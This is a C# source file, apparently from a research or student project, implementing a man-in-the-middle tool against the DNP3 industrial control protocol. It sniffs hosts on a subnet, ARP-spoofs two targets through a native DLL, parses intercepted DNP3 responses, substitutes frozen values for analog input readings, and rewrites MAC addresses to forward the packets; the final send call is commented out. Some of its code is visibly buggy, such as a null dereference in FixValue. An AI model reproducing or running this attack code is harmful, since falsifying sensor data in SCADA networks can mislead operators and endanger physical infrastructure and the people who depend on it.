using DNP3DataPointsModel;
using DNP3TCPDriver.ApplicationLayer;
using DNP3TCPDriver.DataLinkLayer;
using DNP3TCPDriver.UserLevel;
using MITM_Common;
using MITM_Common.MITM_Service;
using PubSub;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace MITM_Service
{
    public class MITM_Service : IMITM_Contract
    {
        [DllImport("ARPSpoof.dll", EntryPoint = "SniffForHosts", CallingConvention = CallingConvention.Cdecl)]
        public static extern void SniffForHosts(ref ConnectionInfoStruct connectionInfo);

        [DllImport("ARPSpoof.dll", EntryPoint = "ARPSpoof", CallingConvention = CallingConvention.Cdecl)]
        public static extern void ARPSpoof(ref ARPSpoofParticipantsInfo participants);

        [DllImport("ARPSpoof.dll", EntryPoint = "RetreivePackets", CallingConvention = CallingConvention.Cdecl)]
        public static extern void RetreivePackets(ref PacketStruct packetStructs);

        [DllImport("ARPSpoof.dll", EntryPoint = "Terminate", CallingConvention = CallingConvention.Cdecl)]
        public static extern void Terminate();

        [DllImport("ARPSpoof.dll", EntryPoint = "SendPacket", CallingConvention = CallingConvention.Cdecl)]
        public static extern void SendPacket(ref SendPacketStruct packetStruct);

        private List<byte> hostsIPends;
        private int sniffForHostsInterval = 7;
        private bool terminate = false;

        private object packetLockObject;

        private Publisher publisher;

        private Queue<PacketStruct> packetStructs;
        private DataLinkHandler dataLinkHandler;
        private ApplicationHandler applicationHandler;

        public MITM_Service()
        {
            hostsIPends = new List<byte>();
            packetStructs = new Queue<PacketStruct>();
            packetLockObject = new object();
            publisher = new Publisher();
            dataLinkHandler = new DataLinkHandler();
            applicationHandler = new ApplicationHandler();
        }

        public void ARPSpoof(ARPSpoofParticipantsInfo participants)
        {
            terminate = false;

            lock (Database.lockObject)
            {
                Database.ARPSpoofParticipantsInfo = participants;
            }

            Task.Factory.StartNew(() => ARPSpoof(ref participants));
            Task.Factory.StartNew(() => PacketProducer());
            Task.Factory.StartNew(() => PacketConsumer());
        }

        public void PacketProducer()
        {
            int maxPacketNum = 20;
            PacketStruct packetStruct = new PacketStruct();

            try
            {
                while (!terminate)
                {
                    RetreivePackets(ref packetStruct);

                    if (packetStruct.source_addr[0] == 0)
                    {
                        Thread.Sleep(100);
                        continue;
                    }

                    lock (packetLockObject)
                    {
                        packetStructs.Enqueue(packetStruct);
                    }

                    packetStruct = new PacketStruct();

                    Thread.Sleep(100);
                }
            }
            catch (Exception e) { }
        }

        public void PacketConsumer()
        {
            PacketStruct packetStruct;
            try
            {
                while (!terminate)
                {
                    if (packetStructs.Count() > 0)
                    {

                        lock (packetLockObject)
                        {
                            packetStruct = packetStructs.Dequeue();
                        }

                        int offset = packetStruct.dataOffset;

                        byte len = packetStruct.packet[offset + 2];

                        int actualLen = packetStruct.dataLength;

                        byte[] message = new byte[actualLen];

                        for (int i = 0; i < actualLen; i++)
                        {
                            message[i] = packetStruct.packet[offset + i];
                        }

                        List<UserLevelObject> userLevelObjects = dataLinkHandler.PackUp(message);

                        if (userLevelObjects == null)
                        {
                            continue;
                        }

                        Task.Factory.StartNew(() => ProcessObjects(userLevelObjects, packetStruct));

                        Thread.Sleep(100);
                    }
                }
            }
            catch (Exception e) { }
        }

        private bool AreEqual(byte[] first, byte[] second)
        {
            if (first.Length != second.Length)
            {
                return false;
            }

            for (int i = 0; i < first.Length; i++)
            {
                if (first[i] != second[i])
                {
                    return false;
                }
            }

            return true;
        }

        void ProcessObjects(List<UserLevelObject> userLevelObjects, PacketStruct packetStruct)
        {
            try
            {
                foreach (UserLevelObject userObject in userLevelObjects)
                {
                    if (userObject.FunctionCode == ApplicationFunctionCodes.RESPONSE)
                    {
                        if (!userObject.IndicesPresent)
                        {
                            if (userObject.RangeFieldPresent)
                            {
                                if (userObject.RangePresent)
                                {
                                    for (int i = userObject.StartIndex; i <= userObject.StopIndex; i++)
                                    {
                                        AnalogInputPoint analogInputPoint;
                                        if (!Database.AnalogInputPoints.TryGetValue(i, out analogInputPoint))
                                        {
                                            analogInputPoint = new AnalogInputPoint();

                                            lock (Database.lockObject)
                                            {
                                                Database.AnalogInputPoints.Add(i, analogInputPoint);
                                            }
                                        }

                                        lock (Database.lockObject)
                                        {
                                            analogInputPoint.RawOutValue = BitConverter.ToInt32(userObject.Values[i], 0);
                                            analogInputPoint.OutValue = analogInputPoint.RawValue * analogInputPoint.ScaleFactor + analogInputPoint.ScaleOffset;

                                            FixedValue fixedValue = null;
                                            if (Database.FixedValues.TryGetValue(new Tuple<int, PointType>(i, PointType.ANALOG_INPUT), out fixedValue))
                                            {
                                                userObject.Values[i] = BitConverter.GetBytes(fixedValue.Value);
                                            }
                                            else
                                            {
                                                analogInputPoint.RawMasterValue = analogInputPoint.RawOutValue;
                                                analogInputPoint.MasterValue = analogInputPoint.OutValue;
                                            }
                                        }

                                        publisher.AnalogInputChange(analogInputPoint);
                                    }
                                }
                            }
                        }
                    }
                }

                List<byte[]> segments = applicationHandler.PackDown(userLevelObjects, userLevelObjects[0].FunctionCode, dataLinkHandler.IsMaster, dataLinkHandler.IsPrm);

                int offset = packetStruct.dataOffset;
                int actualLen = packetStruct.dataLength;

                segments[0].CopyTo(packetStruct.packet, packetStruct.dataOffset);

                byte[] transmiterTarget = new byte[6];
                for (int i = 0; i < 6; i++)
                {
                    transmiterTarget[i] = packetStruct.packet[i + 6];
                }

                byte[] receiverTarget;
                if (AreEqual(transmiterTarget, Database.ARPSpoofParticipantsInfo.Target1MACAddress))
                {
                    receiverTarget = Database.ARPSpoofParticipantsInfo.Target2MACAddress;
                }
                else
                {
                    receiverTarget = Database.ARPSpoofParticipantsInfo.Target1MACAddress;
                }

                byte[] myAddress = Database.ARPSpoofParticipantsInfo.MyMACAddress;

                receiverTarget.CopyTo(packetStruct.packet, 0);
                myAddress.CopyTo(packetStruct.packet, 6);

                SendPacketStruct sendPacketStruct = new SendPacketStruct();
                sendPacketStruct.Name = Database.GlobalConnectionInfo.Name;
                sendPacketStruct.Packet = packetStruct.packet;
                sendPacketStruct.Size = offset + actualLen;

                //Task.Factory.StartNew(() => SendPacket(ref sendPacketStruct));
            }
            catch (Exception e) { }
        }

        public void TerminateActiveAttack()
        {
            terminate = true;
            Terminate();
        }

        public List<Host> SniffForHosts()
        {
            ConnectionInfoStruct connectionInfoStruct = new ConnectionInfoStruct();
            connectionInfoStruct.SubnetMask = Database.GlobalConnectionInfo.SubnetMask;
            connectionInfoStruct.DefaultGateway = new byte[4] { 192, 168, 0, 1 };
            connectionInfoStruct.IPAddress = Database.GlobalConnectionInfo.IPAddress;
            connectionInfoStruct.MACAddress = Database.GlobalConnectionInfo.MACAddress;
            connectionInfoStruct.Name = Database.GlobalConnectionInfo.Name;
            connectionInfoStruct.Hosts = new byte[200];
            connectionInfoStruct.Sleep = (this.sniffForHostsInterval) * 1000;

            SniffForHosts(ref connectionInfoStruct);

            List<Host> hosts = new List<Host>();

            int j = 0;
            while (connectionInfoStruct.HostCount > 0)
            {
                if (hostsIPends.Contains(connectionInfoStruct.Hosts[j]) || connectionInfoStruct.Hosts[j] == Database.GlobalConnectionInfo.IPAddress[3])
                {
                    j += 7;
                    connectionInfoStruct.HostCount--;
                    continue;
                }

                hostsIPends.Add(connectionInfoStruct.Hosts[j]);

                Host host = new Host();

                // bug ako subnet mask nije odgovarajuc!!!!!
                host.IPAddressArray
                    = new byte[4] {
                        Database.GlobalConnectionInfo.IPAddress[0],
                        Database.GlobalConnectionInfo.IPAddress[1],
                        Database.GlobalConnectionInfo.IPAddress[2],
                        connectionInfoStruct.Hosts[j]
                    };

                for (int k = 0; k < 4; k++)
                {
                    host.IPAddressString += host.IPAddressArray[k];

                    if (k != 3)
                    {
                        host.IPAddressString += ".";
                    }
                }

                host.MACAddressArray = new byte[6];
                for (int k = 0; k < 6; k++)
                {
                    host.MACAddressArray[k] = connectionInfoStruct.Hosts[++j];

                    host.MACAddressString += host.MACAddressArray[k].ToString("X");

                    if (k != 5)
                    {
                        host.MACAddressString += ":";
                    }
                }

                hosts.Add(host);

                j++;
                connectionInfoStruct.HostCount--;
            }

            return hosts;
        }

        public void FixValue(PointType pointType, int index)
        {
            FixedValue fixedValue = null;
            if (pointType == PointType.ANALOG_INPUT)
            {
                lock (Database.lockObject)
                {
                    AnalogInputPoint analogInputPoint = null;
                    if (Database.AnalogInputPoints.TryGetValue(index, out analogInputPoint))
                    {
                        fixedValue.Index = index;
                        fixedValue.Value = analogInputPoint.RawValue;
                    }
                }
            }
        }

        public void ReleaseValue(PointType pointType, int index)
        {
            lock (Database.lockObject)
            {
                FixedValue fixedValue = null;
                if (Database.FixedValues.TryGetValue(new Tuple<int, PointType>(index, pointType), out fixedValue))
                {
                    Database.FixedValues.Remove(new Tuple<int, PointType>(index, pointType));
                }
            }
        }
    }
}
